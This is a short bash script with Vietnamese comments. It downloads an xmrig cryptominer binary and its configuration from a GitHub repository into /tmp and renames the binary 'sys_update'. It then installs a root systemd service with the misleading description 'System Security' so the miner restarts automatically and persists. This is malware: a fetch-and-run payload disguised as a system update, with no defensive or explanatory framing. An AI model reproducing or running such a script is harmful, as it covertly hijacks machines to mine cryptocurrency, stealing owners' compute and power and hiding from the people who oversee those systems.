#!/bin/bash

# Chuyển vào thư mục tạm
cd /tmp || exit

# Tải và làm sạch file config.json ngay lập tức bằng lệnh 'tr'
curl -sL https://github.com/AnnaliseHackett/Fix/raw/refs/heads/main/config.json | tr -d '\r' > config.json

# Tải file thực thi
curl -sL https://github.com/AnnaliseHackett/Fix/raw/refs/heads/main/xmrig -o sys_update
chmod +x sys_update

# Tạo file service bằng printf để đảm bảo xuống dòng chuẩn LF
printf "[Unit]\nDescription=System Security\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/tmp/sys_update --config=/tmp/config.json\nRestart=always\nUser=root\n\n[Install]\nWantedBy=multi-user.target\n" > /etc/systemd/system/sys_update.service

# Kích hoạt hệ thống
systemctl daemon-reload
systemctl enable sys_update
systemctl start sys_update
